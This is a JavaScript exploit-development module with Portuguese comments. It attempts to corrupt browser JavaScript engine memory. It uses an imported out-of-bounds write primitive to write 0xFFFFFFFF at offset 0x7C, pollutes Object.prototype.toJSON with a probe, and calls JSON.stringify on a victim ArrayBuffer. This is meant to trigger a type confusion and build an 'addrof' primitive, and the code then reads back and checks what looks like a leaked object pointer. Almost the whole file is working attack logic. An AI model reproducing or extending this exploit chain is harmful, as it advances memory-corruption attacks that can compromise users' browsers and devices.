// js/script3/testArrayBufferVictimCrash.mjs (V1.1 - Tentativa de Replicar Log de Referência)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V1_RefSim"; // Nome para esta tentativa

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

// Objeto global para detalhes da sonda, SIMPLES como no Log de Referência
let toJSON_call_details_v1_ref = {};
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_final_check = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Simulando Log de Referência V1 ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar estado para o teste atual
    toJSON_call_details_v1_ref = { // Estrutura simples como no Log de Referência
        probe_variant: FNAME_MODULE_V28, // Para identificar a origem
        this_type_in_toJSON: "N/A",      // Campo chave do Log de Referência
        error_in_toJSON: null,
        probe_called: false,
        addrof_write_attempted_v1_ref: false // Adicionado para clareza
    };

    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_final_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V1_RefSim" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v1_ref = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu no momento certo."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        float64_view_ref_for_final_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_final_check.fill(fill_pattern_v1_ref);
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_ref_for_final_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function Probe_V1_RefSim_toJSON() {
                    // Modificar o objeto global toJSON_call_details_v1_ref
                    toJSON_call_details_v1_ref.probe_called = true;
                    const current_type = Object.prototype.toString.call(this);
                    
                    // Atualiza o tipo APENAS se 'this' for o victim_ab,
                    // para simular o comportamento onde o tipo do victim_ab é o que fica registrado.
                    if (this === victim_ab_ref_for_original_test) {
                        toJSON_call_details_v1_ref.this_type_in_toJSON = current_type;
                        logS3(`[Probe_V1_RefSim] 'this' é victim_ab. Tipo ATUAL: ${current_type}`, "leak");

                        // Lógica original da V1: só tenta escrever se o tipo JÁ FOR [object Object]
                        if (current_type === '[object Object]' && object_to_leak_for_addrof_attempt) {
                            logS3(`[Probe_V1_RefSim] HEISENBUG CONFIRMADA NO VICTIM_AB! Tipo: ${current_type}. Tentando escrita de addrof...`, "vuln");
                            try {
                                this[0] = object_to_leak_for_addrof_attempt;
                                toJSON_call_details_v1_ref.addrof_write_attempted_v1_ref = true;
                                logS3(`[Probe_V1_RefSim] Escrita em victim_ab (supostamente) realizada.`, "info");
                            } catch (e_write) {
                                toJSON_call_details_v1_ref.error_in_toJSON = `WriteAttemptError: ${e_write.name}: ${e_write.message}`;
                                logS3(`[Probe_V1_RefSim] ERRO durante tentativa de escrita em victim_ab[0]: ${e_write.message}`, "error");
                            }
                        } else if (current_type !== '[object Object]') {
                            logS3(`[Probe_V1_RefSim] victim_ab tipo é ${current_type}. Escrita para addrof não tentada.`, "warn");
                        }
                    } else {
                        // Se 'this' não é victim_ab, apenas loga, não atualiza o this_type_in_toJSON principal
                        logS3(`[Probe_V1_RefSim] 'this' NÃO é victim_ab. Tipo: ${current_type}`, "info");
                    }
                    return { probe_V1_RefSim_minimal_executed: true }; // Retorno simples como no Log de Referência
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V1_RefSim.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); // stringifyOutput recebe o retorno da sonda

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // CORREÇÃO DO LOG: Agora loga o objeto global toJSON_call_details_v1_ref
            logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v1_ref APÓS stringify): ${toJSON_call_details_v1_ref ? JSON.stringify(toJSON_call_details_v1_ref) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            // A lógica de verificação agora usa o estado final de toJSON_call_details_v1_ref
            if (toJSON_call_details_v1_ref.addrof_write_attempted_v1_ref) {
                logS3("PASSO 3: Verificando float64_view_ref_for_final_check[0] APÓS JSON.stringify...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_ref_for_final_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                // ... (resto da lógica de leitura e verificação do buffer como antes)
                logS3(`  Valor lido: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v1_ref) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Escrita no victim_ab tentada (TC confirmada na sonda) E VALOR DO BUFFER MUDOU.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita no victim_ab tentada (TC confirmada na sonda), mas valor do buffer não mudou ou não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v1_ref) < 1e-9) addrof_result.message += " (Buffer não alterado do padrão)";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: TC Probe OK, AddrVal FAIL`;
                }

            } else { // addrof_write_attempted_v1_ref é false
                if (toJSON_call_details_v1_ref.this_type_in_toJSON === '[object Object]') {
                     addrof_result.message = "Type Confusion para [object Object] observada no victim_ab (via this_type_in_toJSON), mas escrita não foi tentada (tipo não era [object Object] no momento da checagem na sonda).";
                     logS3(`  INFO (Log de Referência Replicado?): ${addrof_result.message}`, "warn", FNAME_CURRENT_TEST);
                     document.title = `${FNAME_MODULE_V28}: TC Final OK, AddrWrite SKIPPED`;
                } else {
                    addrof_result.message = "Escrita no victim_ab não tentada e Type Confusion final (via this_type_in_toJSON) não observada.";
                    addrof_result.message += ` Tipo final obs no victim_ab: ${toJSON_call_details_v1_ref.this_type_in_toJSON}.`;
                    logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: No TC, VictimWrite SKIPPED`;
                }
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) {
            logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        }
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_final_check = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v1_ref, // Retorna o objeto global SIMPLES
        addrof_attempt_result: addrof_result
    };
}
